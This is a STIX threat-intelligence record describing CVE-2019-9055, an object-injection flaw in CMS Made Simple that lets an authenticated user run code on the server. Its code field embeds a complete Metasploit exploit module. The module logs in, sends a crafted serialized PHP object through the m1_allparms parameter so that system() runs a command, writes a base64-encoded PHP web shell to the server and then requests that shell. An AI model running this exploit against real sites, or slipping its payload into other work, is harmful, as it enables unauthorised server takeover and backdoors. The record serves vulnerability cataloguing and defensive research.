{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--455c3d09-2af4-47b8-bed2-c1e65f523200",
    "created": "2024-08-14T17:08:13.506083Z",
    "modified": "2024-08-14T17:08:13.506088Z",
    "name": "CMS Made Simple Authenticated RCE via object injection",
    "description": "( An issue was discovered in CMS Made Simple 2.2.8. In the module DesignManager (in the files action.admin_bulk_css.php and action.admin_bulk_template.php), with an unprivileged user with Designer permission, it is possible to reach an unserialize call with a crafted value in the m1_allparms parameter and achieve object injection.  This module has been successfully tested on CMS Made Simple versions 2.2.6, 2.2.7, 2.2.8, 2.2.9 and 2.2.9.1. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cmsms_object_injection_rce.rb",
            "external_id": "cmsms_object_injection_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9055"
        },
        {
            "source_name": "reference",
            "url": "https://newsletter.cmsmadesimple.org/w/89247Qog4jCRCuRinvhsofwg"
        },
        {
            "source_name": "reference",
            "url": "https://www.cmsmadesimple.org/2019/03/Announcing-CMS-Made-Simple-v2.2.10-Spuzzum"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'CMS Made Simple Authenticated RCE via object injection',\n      'Description' => %q(\n        An issue was discovered in CMS Made Simple 2.2.8.\n        In the module DesignManager (in the files action.admin_bulk_css.php\n        and action.admin_bulk_template.php), with an unprivileged user\n        with Designer permission, it is possible to reach an unserialize\n        call with a crafted value in the m1_allparms parameter,\n        and achieve object injection.\n\n        This module has been successfully tested on CMS Made Simple versions\n        2.2.6, 2.2.7, 2.2.8, 2.2.9 and 2.2.9.1.\n      ),\n      'Author' => [\n        'Daniele Scanu danielescanu20[at]gmail.com', # Discovered and exploit. twitter.com/sk4pwn\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['CVE', '2019-9055'],\n        ['URL', 'https://newsletter.cmsmadesimple.org/w/89247Qog4jCRCuRinvhsofwg'],\n        ['URL', 'https://www.cmsmadesimple.org/2019/03/Announcing-CMS-Made-Simple-v2.2.10-Spuzzum']\n      ],\n      'Privileged' => false,\n      'Platform' => ['php'],\n      'Arch' => [ARCH_PHP],\n      'Targets' => [['Automatic', {}]],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2019-03-26'))\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Base cmsms directory path', '/']),\n        OptString.new('USERNAME', [true, 'Username to authenticate with', '']),\n        OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])\n      ]\n    )\n  end\n\n  def multipart_form_data(uri, data, message)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', uri),\n      'method' => 'POST',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{message.bound}\",\n      'cookie' => @cookies\n    )\n  end\n\n  def post(uri, data)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', uri),\n      'method' => 'POST',\n      'vars_post' => data,\n      'cookie' => @cookies\n    )\n  end\n\n  def get(path, filename)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, path, filename),\n      'method' => 'GET'\n    )\n  end\n\n  def check\n    res = get('', 'index.php')\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.body.match?(/CMS Made Simple/i)\n      return CheckCode::Safe\n    end\n\n    version = Rex::Version.new(res.body.scan(/CMS Made Simple<\\/a> version (\\d+\\.\\d+\\.\\d+)/).flatten.first)\n    vprint_status(\"#{peer} - CMS Made Simple Version: #{version}\")\n\n    if version <= Rex::Version.new('2.2.9.1')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def login\n    data = {\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'loginsubmit' => 'Submit'\n    }\n    res = post('login.php', data)\n\n    unless res\n      fail_with(Failure::Unreachable,\n        'A response was not received from the remote host')\n    end\n\n    unless res.code == 302 && res.get_cookies && res.headers['Location'] =~ %r{\\/admin\\?(.*)?=(.*)}\n      fail_with(Failure::NoAccess, 'Authentication was unsuccessful')\n    end\n    store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    vprint_good(\"#{peer} - Authentication successful\")\n    @csrf_name = Regexp.last_match(1)\n    csrf_val = Regexp.last_match(2)\n    @csrf = { @csrf_name => csrf_val }\n    @cookies = res.get_cookies\n  end\n\n  def send_injection\n    # prepare shell command\n    shell_name = rand_text_alpha(8..12) + '.php'\n    cmd = Rex::Text.encode_base64(payload.encoded).delete('\\n', '')\n    cmd = \"echo \\\"<?php eval(base64_decode('#{cmd}')); ?>\\\" > #{shell_name}\"\n\n    # prepare serialized object\n    final_payload = 'a:2:{s:10:\"css_select\";a:4:{i:0;s:2:\"19\";i:1;s:2:\"21\";i:2;O:13:\"dm_xml_reader\":1:{s:31:\"'\n    final_payload += \"\\x00\" + 'dm_xml_reader' + \"\\x00\"\n    final_payload += '_old_err_handler\";a:2:{i:0;O:21:\"CmsLayoutTemplateType\":1:{s:28:\"'\n    final_payload += \"\\x00\" + 'CmsLayoutTemplateType' + \"\\x00\"\n    final_payload += '_data\";a:2:{s:13:\"help_callback\";s:6:\"system\";s:4:\"name\";s:' + cmd.length.to_s + ':\"' + cmd + '\";}}'\n    final_payload += 'i:1;s:21:\"get_template_helptext\";}};i:3;s:5:\"dummy\";}s:15:\"css_bulk_action\";s:6:\"export\";}'\n\n    # create message with payload\n    message = Rex::MIME::Message.new\n    message.add_part(@csrf[@csrf_name], nil, nil, \"form-data; name=\\\"#{@csrf_name}\\\"\")\n    message.add_part('DesignManager,m1_,admin_bulk_template,0', nil, nil, 'form-data; name=\"mact\"')\n    message.add_part(Rex::Text.encode_base64(final_payload), nil, nil, 'form-data; name=\"m1_allparms\"')\n    data = message.to_s\n\n    # send payload\n    payload_res = multipart_form_data('moduleinterface.php', data, message)\n    fail_with(Failure::NotFound, 'Failed to send payload') unless payload_res\n    register_files_for_cleanup(shell_name)\n    # open shell\n    res = get('admin', shell_name)\n    if res && res.code == 404\n      print_error \"Shell #{shell_name} not found\"\n    end\n  end\n\n  def exploit\n    login\n    send_injection\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-26",
    "x_mitre_platforms": [
        "['php']"
    ]
}